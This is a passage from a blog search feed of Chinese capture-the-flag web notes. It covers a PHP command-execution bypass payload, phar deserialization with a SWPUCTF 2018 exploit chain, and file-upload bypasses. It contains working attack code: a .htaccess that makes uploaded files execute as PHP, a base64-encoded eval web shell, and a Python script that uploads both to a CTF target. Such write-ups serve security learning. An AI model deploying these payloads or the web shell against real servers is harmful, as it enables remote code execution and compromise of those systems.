/*</span><br></code></pre></td></tr></table></figure><p>用上面的穷举脚本找出最适合的进制转换exec</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;34 23 22950&quot;</span>&#125;<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>) <span class="hljs-comment">//exec</span><br></code></pre></td></tr></table></figure><p>无花括号payload</p><p>长度:70</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)((<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)^exp^tan))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227751.jpg" alt="7"></p><p>本地php7.4以上也能成功执行(但是php8以后有个fatal error 不能使用未定义常量，直接用函数名异或的时候会识别成常量)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072229986.jpg" alt="9"></p><p>不过这边尝试了下带花括号的，似乎也能成功，花括号只在php8以后才被定义为<strong>Fatal error</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227919.jpg" alt="11"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227457.jpg" alt="12"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化</title>
    <link href="/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>1.a stub<br>    可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件<br>2.a manifest describing the contents<br>    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方<br>3.the file contents—被压缩文件的内容<br>4.[optional] a signature for verifying Phar integrity (phar file format only)—签名，放在文件末尾</p><h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>会在同目录生成 phar.phar 文件</p><p>注意：要想生成phar文件，必须将phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加. 否则无法生成phar文件</p></blockquote><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>meta-data是以序列化的形式存储的</p><p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，测试后受影响的函数如下</p><p><img src="/../../../Pictures/%60%E2%9A%A0%EF%B8%8Fphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%60/e6c9d24ely1h3lt5nn7yfj20tu09ewfn.jpg" alt="image-20211018194419673"></p><h3 id="SWPUCTF-2018-SimplePHP-EXP"><a href="#SWPUCTF-2018-SimplePHP-EXP" class="headerlink" title="[SWPUCTF 2018]SimplePHP EXP"></a>[SWPUCTF 2018]SimplePHP EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;var/www/html/f1ag.php&#x27;</span>);<span class="hljs-comment">//flag所在路径</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//为了不存在的调用触发__get()</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<span class="hljs-comment">//触发__toString()</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>(); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加图片类型文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//meta-data储存的信息</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//生成签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><blockquote><p>要想生成phar文件，必须将php.ini中phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加.</p><p>生成的phar中metada.bin内容为类序列化后的内容</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="绕过-lt-过滤"><a href="#绕过-lt-过滤" class="headerlink" title="绕过&lt;?过滤"></a>绕过&lt;?过滤</h3><p>.htaccess绕过文件头检查</p><p>如果用一般的<code>GIF89a</code>文件头绕过，会导致htaccess文件无法执行，因此这里用定义高度与宽度，#在htaccess中被视为注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br>#define height 1337<br>AddType application/x-httpd-php .a<br>php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;<br></code></pre></td></tr></table></figure><p>shell.a内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a11<br>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure><blockquote><p>文件头后加的内容是为了补足8个字节，满足base64编码规则</p></blockquote><h3 id="文件上传python脚本"><a href="#文件上传python脚本" class="headerlink" title="文件上传python脚本"></a>文件上传python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">r&quot;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-comment"># 执行get_the_flag函数</span><br>session = requests.session()<br>htaccess_content = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337</span><br><span class="hljs-string">AddType application/x-httpd-php .a</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>files_htaccess = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_hta = session.post(url, files=files_htaccess)<br><span class="hljs-built_in">print</span>(res_hta.text)<br>shell_file = <span class="hljs-string">&#x27;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#x27;</span><br>files_shell = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;shell.a&#x27;</span>, shell_file, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_jpg = session.post(url, files=files_shell)<br><br><span class="hljs-built_in">print</span>(res_jpg.text)  <span class="hljs-comment"># 打印路径</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
